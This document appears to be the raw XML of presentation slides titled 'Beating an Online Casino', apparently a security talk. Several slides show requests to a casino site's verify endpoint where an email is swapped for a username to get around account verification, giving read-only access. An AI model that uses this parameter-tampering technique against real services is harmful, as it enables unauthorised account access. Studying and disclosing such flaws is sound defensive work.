            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="646" name="Google Shape;646;p79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="647" name="Google Shape;647;p79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="651" name="Shape 651"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="652" name="Google Shape;652;p80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="3167700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST lottery-api.casinosite.com/api/v1/users/verify</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "email": "john.doe@gmail.com",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "verification_code": "ABC123XYZ"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SUCCESS (but not activated)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="653" name="Google Shape;653;p80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;654;p80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="655" name="Google Shape;655;p80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="656" name="Google Shape;656;p80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide6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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="660" name="Shape 660"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="661" name="Google Shape;661;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="1810200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Going back to the login page the user is asked for a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3200">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre ExtraBold"/>
                <a:ea typeface="Abhaya Libre ExtraBold"/>
                <a:cs typeface="Abhaya Libre ExtraBold"/>
                <a:sym typeface="Abhaya Libre ExtraBold"/>
              </a:rPr>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t> and not a userID or  Email address</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="662" name="Google Shape;662;p81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;663;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="664" name="Google Shape;664;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="665" name="Google Shape;665;p81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="669" name="Shape 669"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="670" name="Google Shape;670;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="3167700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST lottery-api.casinosite.com/api/v1/users/verify</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "username": "john.doe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900" strike="sngStrike">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>@gmail.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "verification_code": "ABC123XYZ"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SUCCESS (READ ONLY ACCOUNT)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
